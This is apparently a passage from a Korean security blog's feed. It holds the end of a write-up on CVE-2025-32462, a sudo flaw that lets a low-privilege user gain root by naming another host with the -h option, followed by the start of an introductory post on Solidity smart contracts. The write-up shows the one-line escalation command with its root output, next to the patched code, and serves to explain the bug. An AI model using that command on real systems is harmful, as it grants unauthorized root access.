&#xD638;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; command&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xB294; &#xC635;&#xC158;&#xC73C;&#xB85C;, &#xC0AC;&#xC6A9;&#xC790; &#xAD8C;&#xD55C;&#xC744; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; <code>-l</code> &#xC635;&#xC158;&#xACFC; &#xD568;&#xAED8; &#xC0AC;&#xC6A9;&#xB420; &#xB54C;&#xB9CC; &#xB3D9;&#xC791;&#xB418;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xBCC4;&#xB3C4;&#xC758; &#xCF54;&#xB4DC;&#xAC00; &#xC5C6;&#xC5B4; &#xB2E4;&#xB978; &#xBA85;&#xB839;&#xC5B4;&#xB098; &#xC635;&#xC158;&#xB4E4;&#xACFC; &#xD568;&#xAED8; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD558;&#xC5EC; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">Host_Alias   SERVERS   = prod.test.local, dev.test.localHost_Alias   PROD      = prod.test.locallowpriv      SERVERS, !PROD = NOPASSWD:ALLlowpriv      ci.test.local  = NOWPASSWD:ALL</code></pre><p>&#xC608;&#xC2DC;&#xB85C; sudoers&#xC5D0; &#xC704;&#xC640; &#xAC19;&#xC774; &#xD638;&#xC2A4;&#xD2B8;&#xBCC4; &#xAD8C;&#xD55C;&#xC5D0; &#xB300;&#xD574; &#xC815;&#xC758;&#xD574; &#xB193;&#xC558;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD55C;&#xB2E4;&#xBA74; <code>lowpriv</code> &#xC0AC;&#xC6A9;&#xC790;&#xB294; <code>PROD</code>&#xC5D0; &#xC18D;&#xD55C; <code>prod</code> &#xD638;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xBAA8;&#xB4E0; command&#xB97C; &#xC790;&#xC720;&#xB86D;&#xAC8C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC5C6;&#xC9C0;&#xB9CC; <code>ci</code>, <code>dev</code>&#xD638;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xC5C6;&#xC774; &#xBAA8;&#xB4E0; command&#xB97C; &#xC790;&#xC720;&#xB86D;&#xAC8C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs shell">lowpriv@prod: ~$ sudo -i -h ci.test.localroot@prod ~# iduid=0(root) gid=0(root) groups=0(root)</code></pre><p>&#xD558;&#xC9C0;&#xB9CC; <code>lowpriv</code>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; <code>prod</code>&#xD638;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; <code>-h</code> &#xC635;&#xC158;&#xC744; &#xC774;&#xC6A9;&#xD574; <code>ci</code>&#xB97C; &#xD638;&#xC2A4;&#xD2B8;&#xB85C; &#xC9C0;&#xC815;&#xD574; command&#xB97C; &#xC2E4;&#xD589;&#xD55C;&#xB2E4;&#xBA74; host&#xB85C; &#xC9C0;&#xC815;&#xB41C; <code>ci</code>&#xC758; host &#xADDC;&#xCE59;&#xC744; &#xCC38;&#xC870;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>prod</code> &#xD638;&#xC2A4;&#xD2B8;&#xC5D0; &#xC788;&#xB354;&#xB77C;&#xB3C4; <code>ci</code> &#xD638;&#xC2A4;&#xD2B8;&#xC5D0; &#xC788;&#xB294; &#xAC83; &#xCC98;&#xB7FC; command &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="Patched-Code"><a href="#Patched-Code" class="headerlink" title="Patched Code"></a>Patched Code</h3><pre><code class="hljs c"><span class="hljs-comment">//plugins/sudoers/sudoers.c</span>    <span class="hljs-comment">/* The user may only specify a host for &quot;sudo -l&quot;. */</span><span class="hljs-keyword">if</span> (!ISSET(ctx-&gt;mode, MODE_LIST|MODE_CHECK)) {<span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(ctx-&gt;runas.host, ctx-&gt;user.host) != <span class="hljs-number">0</span>) {    log_warningx(ctx, SLOG_NO_STDERR|SLOG_AUDIT, N_(<span class="hljs-string">&quot;user not allowed to set remote host for command&quot;</span>));    sudo_warnx(<span class="hljs-string">&quot;%s&quot;</span>,U_(<span class="hljs-string">&quot;a remote host may only be specified when listing privileges.&quot;</span>));    ret = <span class="hljs-literal">false</span>;    <span class="hljs-keyword">goto</span> done;}}</code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD604;&#xC7AC; sudo v1.9.17.p1 &#xC5D0;&#xC11C; &#xD328;&#xCE58; &#xB418;&#xC5C8;&#xC73C;&#xBA70;, &#xC704;&#xC640; &#xAC19;&#xC774; <code>--host</code> &#xC635;&#xC158;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xACBD;&#xC6B0; <code>-l</code> &#xC635;&#xC158;&#xACFC; &#xC0AC;&#xC6A9;&#xB418;&#xB294;&#xC9C0; &#xAC80;&#xC99D;&#xD558;&#xB3C4;&#xB85D; &#xCD94;&#xAC00;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://medium.com/%40mhdg./cve-2025-32462-how-a-12-year-old-sudo-bug-lets-you-become-root-where-you-shouldnt-780699101736">https://medium.com/%40mhdg./cve-2025-32462-how-a-12-year-old-sudo-bug-lets-you-become-root-where-you-shouldnt-780699101736</a></li><li><a href="https://github.com/sudo-project/sudo/compare/v1.9.17...v1.9.17p1#diff-3c3a7aef57f7e2064df2e257ef0ab3dc921897262519f15b5f367f2756e5d0ddL330">https://github.com/sudo-project/sudo/compare/v1.9.17...v1.9.17p1#diff-3c3a7aef57f7e2064df2e257ef0ab3dc921897262519f15b5f367f2756e5d0ddL330</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/EoP/">EoP</category>
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/sudo/">sudo</category>
      
      <category domain="https://hackyboiz.github.io/tags/sudoers/">sudoers</category>
      
      <category domain="https://hackyboiz.github.io/tags/host/">host</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-32462/">CVE-2025-32462</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/16/poosic/cve-2025-32462/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] From Paper to Code: Smart Contract [ko]</title>
      <link>https://hackyboiz.github.io/2025/07/13/bekim/smartcontract/ko/</link>
      <guid>https://hackyboiz.github.io/2025/07/13/bekim/smartcontract/ko/</guid>
      <pubDate>Sun, 13 Jul 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;&amp;#xC55E;&amp;#xC120; &amp;#xAE00;&amp;#xC5</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>&#xC55E;&#xC120; &#xAE00;&#xC5D0;&#xC11C; &#xC6B0;&#xB9AC;&#xB294; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xACFC; &#xD569;&#xC758; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA70;, &#xD0C8;&#xC911;&#xC559;&#xD654;&#xB41C; &#xAD6C;&#xC870;&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xD588;&#xC5B4;&#xC694;. &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xBE14;&#xB85D;&#xCCB4;&#xC778; &#xC704;&#xC5D0; &#xAD6C;&#xCD95;&#xB420; &#xC218; &#xC788;&#xB294; &#xD575;&#xC2EC; &#xAE30;&#xC220;&#xC778; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC5D0; &#xB300;&#xD574; &#xB2E4;&#xB904;&#xBCF4;&#xB824;&#xACE0; &#xD574;&#xC694;.</p><p>&#xAE30;&#xC874;&#xC758; &#xACC4;&#xC57D;&#xC740; &#xC885;&#xC774; &#xBB38;&#xC11C;&#xC640; &#xC11C;&#xBA85;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC;, &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB294; &#xC774; &#xACC4;&#xC57D; &#xC870;&#xAC74;&#xC744; &#xCF54;&#xB4DC;&#xB85C; &#xAD6C;&#xD604;&#xD558;&#xACE0;, &#xD2B9;&#xC815; &#xC870;&#xAC74;&#xC774; &#xCDA9;&#xC871;&#xB418;&#xBA74; &#xC911;&#xAC1C;&#xC790; &#xC5C6;&#xC774; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC785;&#xB2C8;&#xB2E4;.<br>&#xC774; &#xAE00;&#xC5D0;&#xC11C;&#xB294; Smart Contract&#xC758; &#xC6D0;&#xB9AC;&#xC640; &#xC0AC;&#xB840;&#xB97C; &#xC18C;&#xAC1C;&#xD558;&#xACE0;, &#xC774;&#xC5D0; &#xB300;&#xD55C; &#xBCF4;&#xC548; &#xCDE8;&#xC57D;&#xC810;&#xB3C4; &#xD568;&#xAED8; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="&#xC2A4;&#xB9C8;&#xD2B8;-&#xCEE8;&#xD2B8;&#xB799;&#xD2B8;"><a href="#&#xC2A4;&#xB9C8;&#xD2B8;-&#xCEE8;&#xD2B8;&#xB799;&#xD2B8;" class="headerlink" title="&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;"></a>&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;</h2><p>&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB294; &#xBBF8;&#xB9AC; &#xC815;&#xD574;&#xB454; &#xC870;&#xAC74;&#xC774; &#xCDA9;&#xC871;&#xB418;&#xBA74; &#xD574;&#xB2F9; &#xACC4;&#xC57D;&#xC774; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB41C; &#xCF54;&#xB4DC;&#xC5D0;&#xC694;. &#xACC4;&#xC57D; &#xC870;&#xAC74;&#xC744; &#xCF54;&#xB4DC;&#xB85C; &#xAD6C;&#xD604;&#xD574;&#xC11C; &#xBE14;&#xB85D;&#xCCB4;&#xC778; &#xC0C1;&#xC5D0;&#xC11C;&#xB3C4; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xD2B9;&#xC131; &#xB355;&#xBD84;&#xC5D0; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB294; &#xC911;&#xAC1C; &#xBE44;&#xC6A9;&#xC744; &#xC808;&#xAC10;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC81C;3&#xC790; &#xC5C6;&#xC774; &#xACC4;&#xC57D;&#xC744; &#xC774;&#xD589;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;.</p><p>&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC758; &#xAC1C;&#xB150;&#xC740; 1994&#xB144;, &#xB2C9; &#xC0AC;&#xBCF4;(Nick Szabo)&#xC5D0; &#xC758;&#xD574; &#xCC98;&#xC74C;&#xC73C;&#xB85C; &#xC81C;&#xC548; &#xB418;&#xC5C8;&#xC5B4;&#xC694;. (&#xC5EC;&#xB2F4;&#xC774;&#xC9C0;&#xB9CC; Nick Szabo&#xB294; &#xC0AC;&#xD1A0;&#xC2DC; &#xB098;&#xCE74;&#xBAA8;&#xD1A0;&#xB85C; &#xCD94;&#xC815;&#xB418;&#xB294; &#xC778;&#xBB3C; &#xC911; &#xD55C; &#xBA85;&#xC73C;&#xB85C; &#xC790;&#xC8FC; &#xC5B8;&#xAE09;&#xB418;&#xACE0; &#xC788;&#xC5B4;&#xC694;) &#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xB54C;&#xB294; &#xAC1C;&#xB150; &#xBFD0;&#xC774;&#xC5C8;&#xACE0;, &#xAE30;&#xC220;&#xC801; &#xC2E4;&#xD604;&#xC740; &#xADF8; &#xC774;&#xD6C4;&#xC5D0; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC5B4;&#xC694;. 2013&#xB144; &#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xC758; &#xCC3D;&#xC2DC;&#xC790;&#xC778; &#xBE44;&#xD0C8;&#xB9AD; &#xBD80;&#xD14C;&#xB9B0;(Vitalik Buterin)&#xC740; &#xC790;&#xC2E0;&#xC758; &#xBE14;&#xB85C;&#xADF8;&#xC5D0; <a href="https://web.archive.org/web/20131228111141/http://vbuterin.com/ethereum.html">&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD55C; &#xC0C8;&#xB85C;&#xC6B4; &#xBE14;&#xB85D;&#xCCB4;&#xC778; &#xD50C;&#xB7AB;&#xD3FC;&#xC758; &#xAC1C;&#xB150;&#xC744; &#xB2F4;&#xC740; &#xBC31;&#xC11C;</a>&#xB97C; &#xACF5;&#xAC1C;&#xD588;&#xC5B4;&#xC694;. &#xC774;&#xD6C4; &#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xC774;&#xB77C;&#xB294; &#xBE14;&#xB85D;&#xCCB4;&#xC778; &#xD50C;&#xB7AB;&#xD3FC;&#xC774; 2015&#xB144;&#xC5D0; &#xC815;&#xC2DD;&#xC73C;&#xB85C; &#xB7F0;&#xCE6D;&#xB418;&#xC5C8;&#xACE0;, &#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xAC00; &#xC2E4;&#xC81C; &#xBE14;&#xB85D;&#xCCB4;&#xC778; &#xC0C1;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xAE30; &#xC2DC;&#xC791;&#xD588;&#xC5B4;&#xC694;.</p><p><img src="/2025/07/13/bekim/smartcontract/ko/image.jpg" alt></p><p>&#xD604;&#xC7AC; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB294; &#xC774;&#xB354;&#xB9AC;&#xC6C0; &#xC678;&#xC5D0;&#xB3C4; &#xB2E4;&#xC591;&#xD55C; &#xBE14;&#xB85D;&#xCCB4;&#xC778; &#xD50C;&#xB7AB;&#xD3FC;&#xC5D0;&#xC11C; &#xC4F0;&#xC774;&#xACE0; &#xC788;&#xACE0;, &#xC774;&#xB7F0; &#xACC4;&#xC57D;&#xB4E4;&#xC740; &#xB300;&#xBD80;&#xBD84; if-then &#xC870;&#xAC74;&#xBB38; &#xD615;&#xD0DC;&#xB85C; &#xC791;&#xC131;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC740; &#xC5EC;&#xB7EC; &#xCC38;&#xC5EC;&#xC790;&#xAC00; &#xAC19;&#xC740; &#xC815;&#xBCF4;&#xB97C; &#xACF5;&#xC720;&#xD558;&#xACE0; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xACC4;&#xC57D; &#xC870;&#xAC74;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD558;&#xAE30;&#xC5D0; &#xB9E4;&#xC6B0; &#xC801;&#xC808;&#xD55C; &#xD658;&#xACBD;&#xC73C;&#xB85C; &#xC5EC;&#xACA8;&#xC838;&#xC694;.</p><h3 id="&#xC2A4;&#xB9C8;&#xD2B8;-&#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC758;-&#xB3D9;&#xC791;-&#xBC29;&#xC2DD;"><a href="#&#xC2A4;&#xB9C8;&#xD2B8;-&#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC758;-&#xB3D9;&#xC791;-&#xBC29;&#xC2DD;" class="headerlink" title="&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC758; &#xB3D9;&#xC791; &#xBC29;&#xC2DD;"></a>&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC758; &#xB3D9;&#xC791; &#xBC29;&#xC2DD;</h3><p>&#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D; &#xC5B8;&#xC5B4;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C0;&#xB294;&#xB370; &#xB3D9;&#xC791; &#xC21C;&#xC11C;&#xB97C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC124;&#xBA85;&#xD558;&#xC790;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>1) <strong>&#xCF54;&#xB4DC; &#xC791;&#xC131;</strong></p><p>Solidity&#xC640; &#xAC19;&#xC740; &#xC5B8;&#xC5B4;&#xB85C; &#xC815;&#xB9D0; &#xAC04;&#xB2E8;&#xD55C; &#xC2A4;&#xB9C8;&#xD2B8; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB97C; &#xC791;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs solidity">pragma solidity ^0.8.26;contract Coin {    // The keyword &quot;public&quot; makes variables    // accessible from other contracts    address public minter;    mapping(address =&gt; uint) public balances;    // Events allow clients to react to specific    // contract changes you declare    event Sent(address from, address to, uint amount);    // Constructor code is only run when the contract    // is created    constructor() {        minter = msg.sender;    }    // Sends an amount of newly created coins to an address    // Can only be called by the contract creator    function mint(address receiver, uint amount) public {        require(msg.sender == minter);        balances[receiver] += amount;    }    // Errors allow you to provide information about    // why an operation failed. They are returned    // to the caller of the function.    error InsufficientBalance(uint requested, uint available);    // Sends an amount of existing coins    // from any caller to an address    function send(address receiver, uint amount) public {        require(amount &lt;= balances[msg.sender], InsufficientBalance(amount, balances[msg.sender]));        balances[msg.sender] -= amount;        balances[receiver] += amount;        emit Sent(msg.sender, receiver, amount);    }}</code></pre><p>&#xC704;&#xCC98;&#xB7FC; &#xC791;&#xC131;&#xB41C; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC5D0;&#xB294; &#xBA87; &#xAC00;&#xC9C0; &#xAC1C;&#xB150;&#xC774; &#xB4F1;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs solidity">address public minter;</code></pre><p>&#xC774; &#xCF54;&#xB4DC;&#xB294; &#xC8FC;&#xC18C; &#xD0C0;&#xC785;&#xC758; &#xC0C1;&#xD0DC; &#xBCC0;&#xC218; minter&#xB97C; &#xC120;&#xC5B8;&#xD569;&#xB2C8;&#xB2E4;. address &#xD0C0;&#xC785;&#xC740; 160&#xBE44;&#xD2B8; &#xD06C;&#xAE30;&#xB85C;, &#xC5F0;&#xC0B0;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xBA70;, &#xACC4;&#xC815; &#xC8FC;&#xC18C; &#xD639;&#xC740; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB3FC;&#xC694;. &#xB610;&#xD55C; public &#xD0A4;&#xC6CC;&#xB4DC;&#xB97C; &#xBD99;&#xC774;&#xBA74; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xAC00; &#xC790;&#xB3D9;&#xC73C;&#xB85C; getter &#xD568;&#xC218;&#xB97C; &#xC0DD;&#xC131;&#xD574;&#xC11C; &#xC678;&#xBD80;&#xC5D0;&#xC11C; &#xC774; &#xAC12;&#xC744; &#xC870;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;</p><pre><code class="hljs solidity">mapping(address =&gt; uint) public balances;</code></pre><p>&#xC774; &#xCF54;&#xB4DC;&#xB294; address&#xB97C; &#xD0A4;&#xB85C; &#xD558;&#xACE0;, &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xC758;&#xCF54;&#xC778; &#xC218;&#xB7C9;&#xC744; &#xAC12;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xB9E4;&#xD551;&#xC785;&#xB2C8;&#xB2E4;. &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; public&#xC774; &#xBD99;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC678;&#xBD80;&#xC5D0;&#xC11C; balances&#xB97C; &#xC8FC;&#xC18C; &#xD615;&#xD0DC;&#xB85C; &#xC870;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;</p><pre><code class="hljs solidity">event Sent(address from, address to, uint amount);</code></pre><p>send()&#xD568;&#xC218;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; &#xC904;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xC774;&#xBCA4;&#xD2B8;&#xC5D0;&#xC694;. Sent &#xC774;&#xBCA4;&#xD2B8;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; &#xB9AC;&#xC2A4;&#xB108;&#xB294; &#xC804;&#xC1A1;&#xC790;, &#xC218;&#xC2E0;&#xC790;, &#xAE08;&#xC561; &#xC815;&#xBCF4;&#xB97C; &#xBC1B;&#xC544;&#xC11C; transaction&#xC744; &#xCD94;&#xC801;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs solidity">constructor() {    minter = msg.sender;}</code></pre><p>&#xC0DD;&#xC131;&#xC790;(Constructor) &#xCF54;&#xB4DC;&#xB294; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xAC00; &#xBC30;&#xD3EC;&#xB420; &#xB54C; &#xD55C; &#xBC88;&#xB9CC; &#xC2E4;&#xD589;&#xB3FC;&#xC694;. msg.sender&#xB294; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB97C; &#xBC30;&#xD3EC;&#xD55C; &#xC8FC;&#xC18C;&#xC774;&#xACE0;, &#xC774;&#xB97C; minter&#xB85C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs solidity">function mint(address receiver, uint amount) public {    require(msg.sender == minter);    balances[receiver] += amount;}</code></pre><p>&#xC0C8;&#xB85C;&#xC6B4; &#xCF54;&#xC778;&#xC744; &#xBC1C;&#xD589;&#xD558;&#xC5EC; &#xB2E4;&#xB978; &#xC8FC;&#xC18C;&#xB85C; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; <code>require(msg.sender == minter)</code> &#xC870;&#xAC74;&#xC740; &#xC624;&#xC9C1; &#xBC30;&#xD3EC;&#xC790;&#xB9CC;&#xC774; &#xC774; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC81C;&#xD55C;&#xD574;&#xC694;. &#xADF8;&#xB9AC;&#xACE0; &#xB9CC;&#xC57D; <code>balances[receiver]+amount</code> &#xC5F0;&#xC0B0;&#xC774; uint256&#xC758; &#xCD5C;&#xB300;&#xAC12;&#xC744; &#xB118;&#xB294;&#xB2E4;&#xBA74;,  Solidity&#xC758; &#xAE30;&#xBCF8; &#xC5F0;&#xC0B0; &#xC548;&#xC804;&#xC131;(Checked Arithmetic)&#xC5D0; &#xB530;&#xB77C; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC740; &#xC790;&#xB3D9;&#xC73C;&#xB85C; revert &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs solidity">error InsufficientBalance(uint requested, uint available);</code></pre><p>&#xC5D0;&#xB7EC;&#xBA54;&#xC2DC;&#xC9C0; error&#xC640; revert&#xB97C; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;&#xC11C; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xAC00;&#xC9C4; &#xCF54;&#xC778;&#xBCF4;&#xB2E4; &#xB354; &#xB9CE;&#xC740; &#xC591;&#xC744; &#xBCF4;&#xB0B4;&#xB824;&#xACE0; &#xD560; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; InsufficientBalance &#xC624;&#xB958;&#xC640; &#xD568;&#xAED8; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC774; &#xCDE8;&#xC18C;&#xB3FC;&#xC694;.</p><pre><code class="hljs solidity">function send(address receiver, uint amount) public {    require(amount &lt;= balances[msg.sender], InsufficientBalance(amount, balances[msg.sender]));    balances[msg.sender] -= amount;    balances[receiver] += amount;    emit Sent(msg.sender, receiver, amount);}</code></pre><p>&#xC790;&#xC2E0;&#xC774; &#xBCF4;&#xC720;&#xD55C; &#xCF54;&#xC778;&#xC744; &#xB2E4;&#xB978; &#xC8FC;&#xC18C;&#xB85C; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; require &#xC870;&#xAC74;&#xC744; &#xCDA9;&#xC871;&#xD558;&#xC9C0; &#xBABB;&#xD55C;&#xB2E4;&#xBA74; InsufficientBalance &#xC5D0;&#xB7EC;&#xAC00; &#xB098;&#xB294; &#xCF54;&#xB4DC;&#xC5D0;&#xC694;.</p><p>2) <strong>&#xCEF4;&#xD30C;&#xC77C; &#xBC0F; &#xBC30;&#xD3EC;</strong></p><p>&#xC791;&#xC131;&#xD55C; &#xCF54;&#xB4DC;&#xB294; Solidity &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB97C; &#xD1B5;&#xD574; Bytecode&#xC640; Application Binary Interface (ABI)&#xB85C; &#xBCC0;&#xD658;&#xB429;&#xB2C8;&#xB2E4;. </p><ul><li>Bytecode&#xB294; &#xC774;&#xB354;&#xB9AC;&#xC6C0; &#xAC00;&#xC0C1;&#xBA38;&#xC2E0;(EVM)&#xC774; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xC800;&#xC218;&#xC900; &#xCF54;&#xB4DC;&#xB85C;, &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xB97C; &#xBE14;&#xB85D;&#xCCB4;&#xC778;&#xC5D0; &#xBC30;&#xD3EC;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB3FC;&#xC694;.</li><li>ABI&#xB294; &#xC678;&#xBD80;&#xC5D0;&#xC11C; &#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC758; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB85C;, &#xD568;&#xC218; &#xC774;&#xB984;&#xACFC; &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xD615;&#xC2DD;&#xC744; &#xC815;&#xC758;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC694;</li></ul><p>&#xC774;&#xB807;&#xAC8C; &#xC0DD;&#xC131;&#xB41C; &#xBC14;&#xC774;&#xD2B8; &#xCF54;&#xB4DC;&#xB294; &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xD615;&#xD0DC;&#xB85C; &#xBE14;&#xB85D;&#xCCB4;&#xC778; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; 